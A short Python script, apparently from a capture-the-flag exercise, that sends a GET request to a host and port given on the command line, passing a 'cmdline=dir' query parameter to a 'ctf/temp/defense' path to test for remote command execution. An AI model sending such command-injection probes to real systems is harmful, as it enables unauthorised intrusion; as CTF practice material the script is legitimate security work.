import requests
import mycheck
import sys


if __name__ == "__main__":
    url = "http://"+sys.argv[1]+":"+sys.argv[2]+"/"
    if mycheck.run() == 1:
        payload = "?cmdline=dir"
        r = requests.get(url+"myweb/mcdx/index/flag/admin/ctf/temp/defense"+payload)
        print(r.text)